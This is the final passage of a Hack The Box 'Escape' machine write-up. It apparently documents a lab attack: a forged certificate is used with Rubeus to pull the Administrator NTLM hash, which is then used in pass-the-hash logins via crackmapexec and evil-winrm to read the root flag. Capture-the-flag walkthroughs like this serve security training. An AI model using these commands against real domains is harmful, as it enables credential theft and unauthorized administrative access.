<div class="codehilite"><pre><span></span><code><span class="n">openssl</span><span class="w"> </span><span class="n">pkcs12</span><span class="w"> </span><span class="o">-</span><span class="ow">in</span><span class="w"> </span><span class="n">cert</span><span class="o">.</span><span class="n">pem</span><span class="w"> </span><span class="o">-</span><span class="n">inkey</span><span class="w"> </span><span class="n">private</span><span class="o">.</span><span class="n">key</span><span class="w"> </span><span class="o">-</span><span class="n">keyex</span><span class="w"> </span><span class="o">-</span><span class="n">CSP</span><span class="w"> </span><span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span><span class="w"> </span><span class="o">-</span><span class="k">export</span><span class="w"> </span><span class="o">-</span><span class="n">out</span><span class="w"> </span><span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>
</code></pre><br style="line-height: 0.5;"/></div>

We have created a certificate without assigning any password, so it is unprotected.<br/><br/>
Once done, we upload the cert.pfx file to the victim machine. Additionally, we also upload the binary file "Rubeus.exe," which you can find in the same repository as "Certify.exe."<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">upload</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Escape</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>
<span class="n">upload</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Escape</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span>
</code></pre><br style="line-height: 0.5;"/></div>

On the victim machine, we run Rubeus, specifying the user we want to impersonate and the certificate we obtained:<br/><br/>
<div class="codehilite"><pre><span></span><code>.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
</code></pre><br style="line-height: 0.5;"/></div>

Finally, we obtain the NTLM hash of the Administrator user:<br/><br/>
<div class="codehilite"><pre><span></span><code>[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
</code></pre><br style="line-height: 0.5;"/></div>

This type of hash can be used to perform a Pass-the-Hash attack, which means we can use the hash to authenticate without entering a password. Let's verify if it works with crackmapexec:<br/><br/>
<div class="codehilite"><pre><span></span><code>crackmapexec smb 10.10.11.202 -u 'Administrator' -H 'A52F78E4C751E5F5E17E1E9F3E58F4EE'
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/12.png?raw=true"/><br/><br/>
Since the user is Administrator, we can access the system using Evil-WinRM by directly passing the hash, which will allow us to access the system as this user.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="mf">10.10.11.202</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">'Administrator'</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s1">'A52F78E4C751E5F5E17E1E9F3E58F4EE'</span>

<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Documents</span><span class="o">&gt;</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>
<div class="codehilite"><pre><span></span><code><span class="o">*</span><span class="nx">Evil</span><span class="o">-</span><span class="nx">WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="err">\</span><span class="nx">Documents</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">whoami</span>
<span class="nx">sequel</span><span class="err">\</span><span class="nx">administrator</span>
<span class="o">*</span><span class="nx">Evil</span><span class="o">-</span><span class="nx">WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="err">\</span><span class="nx">Documents</span><span class="p">&gt;</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="p">..</span><span class="err">\</span><span class="nx">Desktop</span><span class="err">\</span><span class="nx">root</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">a45c9</span><span class="o">*******************</span><span class="nx">d0007b5</span>
<span class="o">*</span><span class="nx">Evil</span><span class="o">-</span><span class="nx">WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="err">\</span><span class="nx">Documents</span><span class="p">&gt;</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div></br></br></br></br></br></br>
            </div>
        </div>
    </section>

    <footer>
        <p>&copy; 2023 elswix.github.io</p>
    </footer>
</body>
</html>
